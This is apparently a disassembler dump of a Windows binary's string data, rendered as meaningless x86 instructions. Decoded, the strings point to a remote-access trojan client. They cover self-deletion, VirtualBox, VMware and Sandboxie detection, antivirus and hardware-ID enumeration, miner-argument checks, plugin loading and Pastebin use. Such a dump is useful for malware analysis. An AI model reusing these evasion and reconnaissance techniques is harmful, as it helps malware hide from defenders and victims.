  40bdd1:	00 4e 00             	add    %cl,0x0(%esi)
  40bdd4:	55                   	push   %ebp
  40bdd5:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40bdd9:	15 53 00 54 00       	adc    $0x540053,%eax
  40bdde:	41                   	inc    %ecx
  40bddf:	00 52 00             	add    %dl,0x0(%edx)
  40bde2:	54                   	push   %esp
  40bde3:	00 20                	add    %ah,(%eax)
  40bde5:	00 22                	add    %ah,(%edx)
  40bde7:	00 22                	add    %ah,(%edx)
  40bde9:	00 20                	add    %ah,(%eax)
  40bdeb:	00 22                	add    %ah,(%edx)
  40bded:	00 00                	add    %al,(%eax)
  40bdef:	07                   	pop    %es
  40bdf0:	43                   	inc    %ebx
  40bdf1:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  40bdf5:	00 00                	add    %al,(%eax)
  40bdf7:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  40bdfb:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40bdff:	00 22                	add    %ah,(%edx)
  40be01:	00 00                	add    %al,(%eax)
  40be03:	0f 22 00             	mov    %eax,%cr0
  40be06:	20 00                	and    %al,(%eax)
  40be08:	2f                   	das
  40be09:	00 66 00             	add    %ah,0x0(%esi)
  40be0c:	20 00                	and    %al,(%eax)
  40be0e:	2f                   	das
  40be0f:	00 71 00             	add    %dh,0x0(%ecx)
  40be12:	00 05 78 00 70 00    	add    %al,0x700078
  40be18:	00 45 53             	add    %al,0x53(%ebp)
  40be1b:	00 65 00             	add    %ah,0x0(%ebp)
  40be1e:	6c                   	insb   (%dx),%es:(%edi)
  40be1f:	00 65 00             	add    %ah,0x0(%ebp)
  40be22:	63 00                	arpl   %eax,(%eax)
  40be24:	74 00                	je     0x40be26
  40be26:	20 00                	and    %al,(%eax)
  40be28:	2a 00                	sub    (%eax),%al
  40be2a:	20 00                	and    %al,(%eax)
  40be2c:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40be30:	6f                   	outsl  %ds:(%esi),(%dx)
  40be31:	00 6d 00             	add    %ch,0x0(%ebp)
  40be34:	20 00                	and    %al,(%eax)
  40be36:	57                   	push   %edi
  40be37:	00 69 00             	add    %ch,0x0(%ecx)
  40be3a:	6e                   	outsb  %ds:(%esi),(%dx)
  40be3b:	00 33                	add    %dh,(%ebx)
  40be3d:	00 32                	add    %dh,(%edx)
  40be3f:	00 5f 00             	add    %bl,0x0(%edi)
  40be42:	43                   	inc    %ebx
  40be43:	00 6f 00             	add    %ch,0x0(%edi)
  40be46:	6d                   	insl   (%dx),%es:(%edi)
  40be47:	00 70 00             	add    %dh,0x0(%eax)
  40be4a:	75 00                	jne    0x40be4c
  40be4c:	74 00                	je     0x40be4e
  40be4e:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40be52:	53                   	push   %ebx
  40be53:	00 79 00             	add    %bh,0x0(%ecx)
  40be56:	73 00                	jae    0x40be58
  40be58:	74 00                	je     0x40be5a
  40be5a:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40be5e:	00 19                	add    %bl,(%ecx)
  40be60:	4d                   	dec    %ebp
  40be61:	00 61 00             	add    %ah,0x0(%ecx)
  40be64:	6e                   	outsb  %ds:(%esi),(%dx)
  40be65:	00 75 00             	add    %dh,0x0(%ebp)
  40be68:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40be6c:	63 00                	arpl   %eax,(%eax)
  40be6e:	74 00                	je     0x40be70
  40be70:	75 00                	jne    0x40be72
  40be72:	72 00                	jb     0x40be74
  40be74:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40be78:	00 2b                	add    %ch,(%ebx)
  40be7a:	6d                   	insl   (%dx),%es:(%edi)
  40be7b:	00 69 00             	add    %ch,0x0(%ecx)
  40be7e:	63 00                	arpl   %eax,(%eax)
  40be80:	72 00                	jb     0x40be82
  40be82:	6f                   	outsl  %ds:(%esi),(%dx)
  40be83:	00 73 00             	add    %dh,0x0(%ebx)
  40be86:	6f                   	outsl  %ds:(%esi),(%dx)
  40be87:	00 66 00             	add    %ah,0x0(%esi)
  40be8a:	74 00                	je     0x40be8c
  40be8c:	20 00                	and    %al,(%eax)
  40be8e:	63 00                	arpl   %eax,(%eax)
  40be90:	6f                   	outsl  %ds:(%esi),(%dx)
  40be91:	00 72 00             	add    %dh,0x0(%edx)
  40be94:	70 00                	jo     0x40be96
  40be96:	6f                   	outsl  %ds:(%esi),(%dx)
  40be97:	00 72 00             	add    %dh,0x0(%edx)
  40be9a:	61                   	popa
  40be9b:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40be9f:	00 6f 00             	add    %ch,0x0(%edi)
  40bea2:	6e                   	outsb  %ds:(%esi),(%dx)
  40bea3:	00 00                	add    %al,(%eax)
  40bea5:	0b 4d 00             	or     0x0(%ebp),%ecx
  40bea8:	6f                   	outsl  %ds:(%esi),(%dx)
  40bea9:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40bead:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40beb1:	0f 56 00             	orps   (%eax),%xmm0
  40beb4:	49                   	dec    %ecx
  40beb5:	00 52 00             	add    %dl,0x0(%edx)
  40beb8:	54                   	push   %esp
  40beb9:	00 55 00             	add    %dl,0x0(%ebp)
  40bebc:	41                   	inc    %ecx
  40bebd:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40bec1:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  40bec6:	77 00                	ja     0x40bec8
  40bec8:	61                   	popa
  40bec9:	00 72 00             	add    %dh,0x0(%edx)
  40becc:	65 00 00             	add    %al,%gs:(%eax)
  40becf:	15 56 00 69 00       	adc    $0x690056,%eax
  40bed4:	72 00                	jb     0x40bed6
  40bed6:	74 00                	je     0x40bed8
  40bed8:	75 00                	jne    0x40beda
  40beda:	61                   	popa
  40bedb:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40bedf:	00 6f 00             	add    %ch,0x0(%edi)
  40bee2:	78 00                	js     0x40bee4
  40bee4:	00 17                	add    %dl,(%edi)
  40bee6:	53                   	push   %ebx
  40bee7:	00 62 00             	add    %ah,0x0(%edx)
  40beea:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  40bef0:	6c                   	insb   (%dx),%es:(%edi)
  40bef1:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40bef5:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40bef9:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40befd:	1f                   	pop    %ds
  40befe:	2d 00 2d 00 64       	sub    $0x64002d00,%eax
  40bf03:	00 6f 00             	add    %ch,0x0(%edi)
  40bf06:	6e                   	outsb  %ds:(%esi),(%dx)
  40bf07:	00 61 00             	add    %ah,0x0(%ecx)
  40bf0a:	74 00                	je     0x40bf0c
  40bf0c:	65 00 2d 00 6c 00 65 	add    %ch,%gs:0x65006c00
  40bf13:	00 76 00             	add    %dh,0x0(%esi)
  40bf16:	65 00 6c 00 3d       	add    %ch,%gs:0x3d(%eax,%eax,1)
  40bf1b:	00 01                	add    %al,(%ecx)
  40bf1d:	03 31                	add    (%ecx),%esi
  40bf1f:	00 00                	add    %al,(%eax)
  40bf21:	71 53                	jno    0x40bf76
  40bf23:	00 45 00             	add    %al,0x0(%ebp)
  40bf26:	4c                   	dec    %esp
  40bf27:	00 45 00             	add    %al,0x0(%ebp)
  40bf2a:	43                   	inc    %ebx
  40bf2b:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  40bf2f:	00 43 00             	add    %al,0x0(%ebx)
  40bf32:	6f                   	outsl  %ds:(%esi),(%dx)
  40bf33:	00 6d 00             	add    %ch,0x0(%ebp)
  40bf36:	6d                   	insl   (%dx),%es:(%edi)
  40bf37:	00 61 00             	add    %ah,0x0(%ecx)
  40bf3a:	6e                   	outsb  %ds:(%esi),(%dx)
  40bf3b:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  40bf3f:	00 69 00             	add    %ch,0x0(%ecx)
  40bf42:	6e                   	outsb  %ds:(%esi),(%dx)
  40bf43:	00 65 00             	add    %ah,0x0(%ebp)
  40bf46:	20 00                	and    %al,(%eax)
  40bf48:	46                   	inc    %esi
  40bf49:	00 52 00             	add    %dl,0x0(%edx)
  40bf4c:	4f                   	dec    %edi
  40bf4d:	00 4d 00             	add    %cl,0x0(%ebp)
  40bf50:	20 00                	and    %al,(%eax)
  40bf52:	57                   	push   %edi
  40bf53:	00 69 00             	add    %ch,0x0(%ecx)
  40bf56:	6e                   	outsb  %ds:(%esi),(%dx)
  40bf57:	00 33                	add    %dh,(%ebx)
  40bf59:	00 32                	add    %dh,(%edx)
  40bf5b:	00 5f 00             	add    %bl,0x0(%edi)
  40bf5e:	50                   	push   %eax
  40bf5f:	00 72 00             	add    %dh,0x0(%edx)
  40bf62:	6f                   	outsl  %ds:(%esi),(%dx)
  40bf63:	00 63 00             	add    %ah,0x0(%ebx)
  40bf66:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40bf6a:	73 00                	jae    0x40bf6c
  40bf6c:	20 00                	and    %al,(%eax)
  40bf6e:	57                   	push   %edi
  40bf6f:	00 48 00             	add    %cl,0x0(%eax)
  40bf72:	45                   	inc    %ebp
  40bf73:	00 52 00             	add    %dl,0x0(%edx)
  40bf76:	45                   	inc    %ebp
  40bf77:	00 20                	add    %ah,(%eax)
  40bf79:	00 50 00             	add    %dl,0x0(%eax)
  40bf7c:	72 00                	jb     0x40bf7e
  40bf7e:	6f                   	outsl  %ds:(%esi),(%dx)
  40bf7f:	00 63 00             	add    %ah,0x0(%ebx)
  40bf82:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40bf86:	73 00                	jae    0x40bf88
  40bf88:	49                   	dec    %ecx
  40bf89:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40bf8d:	00 3d 00 20 00 00    	add    %bh,0x2000
  40bf93:	17                   	pop    %ss
  40bf94:	43                   	inc    %ebx
  40bf95:	00 6f 00             	add    %ch,0x0(%edi)
  40bf98:	6d                   	insl   (%dx),%es:(%edi)
  40bf99:	00 6d 00             	add    %ch,0x0(%ebp)
  40bf9c:	61                   	popa
  40bf9d:	00 6e 00             	add    %ch,0x0(%esi)
  40bfa0:	64 00 4c 00 69       	add    %cl,%fs:0x69(%eax,%eax,1)
  40bfa5:	00 6e 00             	add    %ch,0x0(%esi)
  40bfa8:	65 00 00             	add    %al,%gs:(%eax)
  40bfab:	11 45 00             	adc    %eax,0x0(%ebp)
  40bfae:	72 00                	jb     0x40bfb0
  40bfb0:	72 00                	jb     0x40bfb2
  40bfb2:	20 00                	and    %al,(%eax)
  40bfb4:	48                   	dec    %eax
  40bfb5:	00 57 00             	add    %dl,0x0(%edi)
  40bfb8:	49                   	dec    %ecx
  40bfb9:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40bfbd:	05 78 00 32 00       	add    $0x320078,%eax
  40bfc2:	00 15 43 00 6c 00    	add    %dl,0x6c0043
  40bfc8:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
  40bfce:	74 00                	je     0x40bfd0
  40bfd0:	49                   	dec    %ecx
  40bfd1:	00 6e 00             	add    %ch,0x0(%esi)
  40bfd4:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40bfd8:	00 09                	add    %cl,(%ecx)
  40bfda:	48                   	dec    %eax
  40bfdb:	00 57 00             	add    %dl,0x0(%edi)
  40bfde:	49                   	dec    %ecx
  40bfdf:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40bfe3:	09 55 00             	or     %edx,0x0(%ebp)
  40bfe6:	73 00                	jae    0x40bfe8
  40bfe8:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bfec:	00 05 4f 00 53 00    	add    %al,0x53004f
  40bff2:	00 13                	add    %dl,(%ebx)
  40bff4:	4d                   	dec    %ebp
  40bff5:	00 69 00             	add    %ch,0x0(%ecx)
  40bff8:	63 00                	arpl   %eax,(%eax)
  40bffa:	72 00                	jb     0x40bffc
  40bffc:	6f                   	outsl  %ds:(%esi),(%dx)
  40bffd:	00 73 00             	add    %dh,0x0(%ebx)
  40c000:	6f                   	outsl  %ds:(%esi),(%dx)
  40c001:	00 66 00             	add    %ah,0x0(%esi)
  40c004:	74 00                	je     0x40c006
  40c006:	00 03                	add    %al,(%ebx)
  40c008:	20 00                	and    %al,(%eax)
  40c00a:	00 09                	add    %cl,(%ecx)
  40c00c:	54                   	push   %esp
  40c00d:	00 72 00             	add    %dh,0x0(%edx)
  40c010:	75 00                	jne    0x40c012
  40c012:	65 00 00             	add    %al,%gs:(%eax)
  40c015:	0b 36                	or     (%esi),%esi
  40c017:	00 34 00             	add    %dh,(%eax,%eax,1)
  40c01a:	62 00                	bound  %eax,(%eax)
  40c01c:	69 00 74 00 00 0b    	imul   $0xb000074,(%eax),%eax
  40c022:	46                   	inc    %esi
  40c023:	00 61 00             	add    %ah,0x0(%ecx)
  40c026:	6c                   	insb   (%dx),%es:(%edi)
  40c027:	00 73 00             	add    %dh,0x0(%ebx)
  40c02a:	65 00 00             	add    %al,%gs:(%eax)
  40c02d:	0b 33                	or     (%ebx),%esi
  40c02f:	00 32                	add    %dh,(%edx)
  40c031:	00 62 00             	add    %ah,0x0(%edx)
  40c034:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  40c03a:	50                   	push   %eax
  40c03b:	00 61 00             	add    %ah,0x0(%ecx)
  40c03e:	74 00                	je     0x40c040
  40c040:	68 00 00 0f 56       	push   $0x560f0000
  40c045:	00 65 00             	add    %ah,0x0(%ebp)
  40c048:	72 00                	jb     0x40c04a
  40c04a:	73 00                	jae    0x40c04c
  40c04c:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40c052:	00 0b                	add    %cl,(%ebx)
  40c054:	41                   	inc    %ecx
  40c055:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40c059:	00 69 00             	add    %ch,0x0(%ecx)
  40c05c:	6e                   	outsb  %ds:(%esi),(%dx)
  40c05d:	00 00                	add    %al,(%eax)
  40c05f:	09 74 00 72          	or     %esi,0x72(%eax,%eax,1)
  40c063:	00 75 00             	add    %dh,0x0(%ebp)
  40c066:	65 00 00             	add    %al,%gs:(%eax)
  40c069:	0b 66 00             	or     0x0(%esi),%esp
  40c06c:	61                   	popa
  40c06d:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40c071:	00 65 00             	add    %ah,0x0(%ebp)
  40c074:	00 17                	add    %dl,(%edi)
  40c076:	50                   	push   %eax
  40c077:	00 65 00             	add    %ah,0x0(%ebp)
  40c07a:	72 00                	jb     0x40c07c
  40c07c:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c080:	72 00                	jb     0x40c082
  40c082:	6d                   	insl   (%dx),%es:(%edi)
  40c083:	00 61 00             	add    %ah,0x0(%ecx)
  40c086:	6e                   	outsb  %ds:(%esi),(%dx)
  40c087:	00 63 00             	add    %ah,0x0(%ebx)
  40c08a:	65 00 00             	add    %al,%gs:(%eax)
  40c08d:	11 50 00             	adc    %edx,0x0(%eax)
  40c090:	61                   	popa
  40c091:	00 73 00             	add    %dh,0x0(%ebx)
  40c094:	74 00                	je     0x40c096
  40c096:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40c09a:	69 00 6e 00 00 13    	imul   $0x1300006e,(%eax),%eax
  40c0a0:	41                   	inc    %ecx
  40c0a1:	00 6e 00             	add    %ch,0x0(%esi)
  40c0a4:	74 00                	je     0x40c0a6
  40c0a6:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40c0ac:	72 00                	jb     0x40c0ae
  40c0ae:	75 00                	jne    0x40c0b0
  40c0b0:	73 00                	jae    0x40c0b2
  40c0b2:	00 13                	add    %dl,(%ebx)
  40c0b4:	49                   	dec    %ecx
  40c0b5:	00 6e 00             	add    %ch,0x0(%esi)
  40c0b8:	73 00                	jae    0x40c0ba
  40c0ba:	74 00                	je     0x40c0bc
  40c0bc:	61                   	popa
  40c0bd:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40c0c1:	00 65 00             	add    %ah,0x0(%ebp)
  40c0c4:	64 00 00             	add    %al,%fs:(%eax)
  40c0c7:	09 50 00             	or     %edx,0x0(%eax)
  40c0ca:	6f                   	outsl  %ds:(%esi),(%dx)
  40c0cb:	00 6e 00             	add    %ch,0x0(%esi)
  40c0ce:	67 00 00             	add    %al,(%bx,%si)
  40c0d1:	05 5c 00 5c 00       	add    $0x5c005c,%eax
  40c0d6:	00 2b                	add    %ch,(%ebx)
  40c0d8:	5c                   	pop    %esp
  40c0d9:	00 72 00             	add    %dh,0x0(%edx)
  40c0dc:	6f                   	outsl  %ds:(%esi),(%dx)
  40c0dd:	00 6f 00             	add    %ch,0x0(%edi)
  40c0e0:	74 00                	je     0x40c0e2
  40c0e2:	5c                   	pop    %esp
  40c0e3:	00 53 00             	add    %dl,0x0(%ebx)
  40c0e6:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c0ea:	75 00                	jne    0x40c0ec
  40c0ec:	72 00                	jb     0x40c0ee
  40c0ee:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40c0f4:	43                   	inc    %ebx
  40c0f5:	00 65 00             	add    %ah,0x0(%ebp)
  40c0f8:	6e                   	outsb  %ds:(%esi),(%dx)
  40c0f9:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40c0fd:	00 72 00             	add    %dh,0x0(%edx)
  40c100:	32 00                	xor    (%eax),%al
  40c102:	00 3d 53 00 65 00    	add    %bh,0x650053
  40c108:	6c                   	insb   (%dx),%es:(%edi)
  40c109:	00 65 00             	add    %ah,0x0(%ebp)
  40c10c:	63 00                	arpl   %eax,(%eax)
  40c10e:	74 00                	je     0x40c110
  40c110:	20 00                	and    %al,(%eax)
  40c112:	2a 00                	sub    (%eax),%al
  40c114:	20 00                	and    %al,(%eax)
  40c116:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40c11a:	6f                   	outsl  %ds:(%esi),(%dx)
  40c11b:	00 6d 00             	add    %ch,0x0(%ebp)
  40c11e:	20 00                	and    %al,(%eax)
  40c120:	41                   	inc    %ecx
  40c121:	00 6e 00             	add    %ch,0x0(%esi)
  40c124:	74 00                	je     0x40c126
  40c126:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40c12c:	72 00                	jb     0x40c12e
  40c12e:	75 00                	jne    0x40c130
  40c130:	73 00                	jae    0x40c132
  40c132:	50                   	push   %eax
  40c133:	00 72 00             	add    %dh,0x0(%edx)
  40c136:	6f                   	outsl  %ds:(%esi),(%dx)
  40c137:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40c13b:	00 63 00             	add    %ah,0x0(%ebx)
  40c13e:	74 00                	je     0x40c140
  40c140:	00 17                	add    %dl,(%edi)
  40c142:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40c146:	73 00                	jae    0x40c148
  40c148:	70 00                	jo     0x40c14a
  40c14a:	6c                   	insb   (%dx),%es:(%edi)
  40c14b:	00 61 00             	add    %ah,0x0(%ecx)
  40c14e:	79 00                	jns    0x40c150
  40c150:	4e                   	dec    %esi
  40c151:	00 61 00             	add    %ah,0x0(%ecx)
  40c154:	6d                   	insl   (%dx),%es:(%edi)
  40c155:	00 65 00             	add    %ah,0x0(%ebp)
  40c158:	00 07                	add    %al,(%edi)
  40c15a:	4e                   	dec    %esi
  40c15b:	00 2f                	add    %ch,(%edi)
  40c15d:	00 41 00             	add    %al,0x0(%ecx)
  40c160:	00 05 2c 00 20 00    	add    %al,0x20002c
  40c166:	00 13                	add    %dl,(%ebx)
  40c168:	53                   	push   %ebx
  40c169:	00 6f 00             	add    %ch,0x0(%edi)
  40c16c:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40c171:	00 61 00             	add    %ah,0x0(%ecx)
  40c174:	72 00                	jb     0x40c176
  40c176:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  40c17b:	09 70 00             	or     %esi,0x0(%eax)
  40c17e:	6f                   	outsl  %ds:(%esi),(%dx)
  40c17f:	00 6e 00             	add    %ch,0x0(%esi)
  40c182:	67 00 00             	add    %al,(%bx,%si)
  40c185:	0d 70 00 6c 00       	or     $0x6c0070,%eax
  40c18a:	75 00                	jne    0x40c18c
  40c18c:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40c190:	6e                   	outsb  %ds:(%esi),(%dx)
  40c191:	00 00                	add    %al,(%eax)
  40c193:	15 73 00 61 00       	adc    $0x610073,%eax
  40c198:	76 00                	jbe    0x40c19a
  40c19a:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40c19e:	6c                   	insb   (%dx),%es:(%edi)
  40c19f:	00 75 00             	add    %dh,0x0(%ebp)
  40c1a2:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40c1a6:	6e                   	outsb  %ds:(%esi),(%dx)
  40c1a7:	00 00                	add    %al,(%eax)
  40c1a9:	07                   	pop    %es
  40c1aa:	44                   	inc    %esp
  40c1ab:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40c1af:	00 00                	add    %al,(%eax)
  40c1b1:	15 73 00 65 00       	adc    $0x650073,%eax
  40c1b6:	6e                   	outsb  %ds:(%esi),(%dx)
  40c1b7:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40c1bb:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c1bf:	00 67 00             	add    %ah,0x0(%edi)
  40c1c2:	69 00 6e 00 00 0d    	imul   $0xd00006e,(%eax),%eax
  40c1c8:	48                   	dec    %eax
  40c1c9:	00 61 00             	add    %ah,0x0(%ecx)
  40c1cc:	73 00                	jae    0x40c1ce
  40c1ce:	68 00 65 00 73       	push   $0x73006500
  40c1d3:	00 00                	add    %al,(%eax)
  40c1d5:	09 48 00             	or     %ecx,0x0(%eax)
  40c1d8:	61                   	popa
  40c1d9:	00 73 00             	add    %dh,0x0(%ebx)
  40c1dc:	68 00 00 1b 50       	push   $0x501b0000
  40c1e1:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c1e5:	00 67 00             	add    %ah,0x0(%edi)
  40c1e8:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40c1ee:	50                   	push   %eax
  40c1ef:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c1f3:	00 67 00             	add    %ah,0x0(%edi)
  40c1f6:	69 00 6e 00 00 07    	imul   $0x700006e,(%eax),%eax
  40c1fc:	52                   	push   %edx
  40c1fd:	00 75 00             	add    %dh,0x0(%ebp)
  40c200:	6e                   	outsb  %ds:(%esi),(%dx)
  40c201:	00 00                	add    %al,(%eax)
  40c203:	0f 4d 00             	cmovge (%eax),%eax
  40c206:	73 00                	jae    0x40c208
  40c208:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40c20c:	61                   	popa
  40c20d:	00 63 00             	add    %ah,0x0(%ebx)
  40c210:	6b 00 00             	imul   $0x0,(%eax),%eax
  40c213:	11 52 00             	adc    %edx,0x0(%edx)
  40c216:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c21a:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40c21e:	76 00                	jbe    0x40c220
  40c220:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40c225:	0b 45 00             	or     0x0(%ebp),%eax
  40c228:	72 00                	jb     0x40c22a
  40c22a:	72 00                	jb     0x40c22c
  40c22c:	6f                   	outsl  %ds:(%esi),(%dx)
  40c22d:	00 72 00             	add    %dh,0x0(%edx)
  40c230:	00 47 6d             	add    %al,0x6d(%edi)
  40c233:	00 61 00             	add    %ah,0x0(%ecx)
  40c236:	73 00                	jae    0x40c238
  40c238:	74 00                	je     0x40c23a
  40c23a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c23e:	4b                   	dec    %ebx
  40c23f:	00 65 00             	add    %ah,0x0(%ebp)
  40c242:	79 00                	jns    0x40c244
  40c244:	20 00                	and    %al,(%eax)
  40c246:	63 00                	arpl   %eax,(%eax)
  40c248:	61                   	popa
  40c249:	00 6e 00             	add    %ch,0x0(%esi)
  40c24c:	20 00                	and    %al,(%eax)
  40c24e:	6e                   	outsb  %ds:(%esi),(%dx)
  40c24f:	00 6f 00             	add    %ch,0x0(%edi)
  40c252:	74 00                	je     0x40c254
  40c254:	20 00                	and    %al,(%eax)
  40c256:	62 00                	bound  %eax,(%eax)
  40c258:	65 00 20             	add    %ah,%gs:(%eax)
  40c25b:	00 6e 00             	add    %ch,0x0(%esi)
  40c25e:	75 00                	jne    0x40c260
  40c260:	6c                   	insb   (%dx),%es:(%edi)
  40c261:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40c265:	00 6f 00             	add    %ch,0x0(%edi)
  40c268:	72 00                	jb     0x40c26a
  40c26a:	20 00                	and    %al,(%eax)
  40c26c:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40c270:	70 00                	jo     0x40c272
  40c272:	74 00                	je     0x40c274
  40c274:	79 00                	jns    0x40c276
  40c276:	2e 00 00             	add    %al,%cs:(%eax)
  40c279:	2d 69 00 6e 00       	sub    $0x6e0069,%eax
  40c27e:	70 00                	jo     0x40c280
  40c280:	75 00                	jne    0x40c282
  40c282:	74 00                	je     0x40c284
  40c284:	20 00                	and    %al,(%eax)
  40c286:	63 00                	arpl   %eax,(%eax)
  40c288:	61                   	popa
  40c289:	00 6e 00             	add    %ch,0x0(%esi)
  40c28c:	20 00                	and    %al,(%eax)
  40c28e:	6e                   	outsb  %ds:(%esi),(%dx)
  40c28f:	00 6f 00             	add    %ch,0x0(%edi)
  40c292:	74 00                	je     0x40c294
  40c294:	20 00                	and    %al,(%eax)
  40c296:	62 00                	bound  %eax,(%eax)
  40c298:	65 00 20             	add    %ah,%gs:(%eax)
  40c29b:	00 6e 00             	add    %ch,0x0(%esi)
  40c29e:	75 00                	jne    0x40c2a0
  40c2a0:	6c                   	insb   (%dx),%es:(%edi)
  40c2a1:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40c2a5:	00 00                	add    %al,(%eax)
  40c2a7:	55                   	push   %ebp
  40c2a8:	49                   	dec    %ecx
  40c2a9:	00 6e 00             	add    %ch,0x0(%esi)
  40c2ac:	76 00                	jbe    0x40c2ae
  40c2ae:	61                   	popa
  40c2af:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40c2b3:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40c2b7:	00 6d 00             	add    %ch,0x0(%ebp)
  40c2ba:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40c2be:	73 00                	jae    0x40c2c0
  40c2c0:	61                   	popa
  40c2c1:	00 67 00             	add    %ah,0x0(%edi)
  40c2c4:	65 00 20             	add    %ah,%gs:(%eax)
  40c2c7:	00 61 00             	add    %ah,0x0(%ecx)
  40c2ca:	75 00                	jne    0x40c2cc
  40c2cc:	74 00                	je     0x40c2ce
  40c2ce:	68 00 65 00 6e       	push   $0x6e006500
  40c2d3:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c2d7:	00 63 00             	add    %ah,0x0(%ebx)
  40c2da:	61                   	popa
  40c2db:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c2df:	00 6f 00             	add    %ch,0x0(%edi)
  40c2e2:	6e                   	outsb  %ds:(%esi),(%dx)
  40c2e3:	00 20                	add    %ah,(%eax)
  40c2e5:	00 63 00             	add    %ah,0x0(%ebx)
  40c2e8:	6f                   	outsl  %ds:(%esi),(%dx)
  40c2e9:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40c2ed:	00 20                	add    %ah,(%eax)
  40c2ef:	00 28                	add    %ch,(%eax)
  40c2f1:	00 4d 00             	add    %cl,0x0(%ebp)
  40c2f4:	41                   	inc    %ecx
  40c2f5:	00 43 00             	add    %al,0x0(%ebx)
  40c2f8:	29 00                	sub    %eax,(%eax)
  40c2fa:	2e 00 00             	add    %al,%cs:(%eax)
  40c2fd:	05 58 00 32 00       	add    $0x320058,%eax
  40c302:	00 00                	add    %al,(%eax)
  40c304:	36 9d                	ss popf
  40c306:	ff a4 36 e0 75 45 af 	jmp    *-0x50ba8a20(%esi,%esi,1)
  40c30d:	eb 5b                	jmp    0x40c36a
  40c30f:	54                   	push   %esp
  40c310:	8a a7 3f 24 00 08    	mov    0x800243f(%edi),%ah
  40c316:	b7 7a                	mov    $0x7a,%bh
  40c318:	5c                   	pop    %esp
  40c319:	56                   	push   %esi
  40c31a:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40c31d:	89 03                	mov    %eax,(%ebx)
  40c31f:	00 00                	add    %al,(%eax)
  40c321:	01 03                	add    %eax,(%ebx)
  40c323:	20 00                	and    %al,(%eax)
  40c325:	01 02                	add    %eax,(%edx)
  40c327:	06                   	push   %es
  40c328:	0e                   	push   %cs
  40c329:	03 06                	add    (%esi),%eax
  40c32b:	12 09                	adc    (%ecx),%cl
  40c32d:	03 06                	add    (%esi),%eax
  40c32f:	12 60 03             	adc    0x3(%eax),%ah
  40c332:	00 00                	add    %al,(%eax)
  40c334:	02 03                	add    (%ebx),%al
  40c336:	06                   	push   %es
  40c337:	12 0d 03 06 12 11    	adc    0x11120603,%cl
  40c33d:	03 06                	add    (%esi),%eax
  40c33f:	1d 05 02 06 0a       	sbb    $0xa060205,%eax
  40c344:	03 06                	add    (%esi),%eax
  40c346:	12 15 02 06 02 02    	adc    0x2020602,%dl
